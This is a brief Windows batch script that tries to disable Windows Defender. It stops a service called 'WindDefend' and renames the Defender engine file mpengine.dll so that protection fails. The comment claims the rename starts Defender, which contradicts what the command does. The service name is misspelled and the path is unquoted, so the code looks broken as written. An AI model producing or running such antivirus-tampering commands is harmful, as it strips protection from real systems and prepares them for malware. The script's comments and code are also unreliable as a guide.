@echo off
::stop defender
sc stop WindDefend
::rename the dll binary to start defender
Ren C:\ProgramData\Microsoft\Windows Defender\Platform\mpengine.dll npengine.dll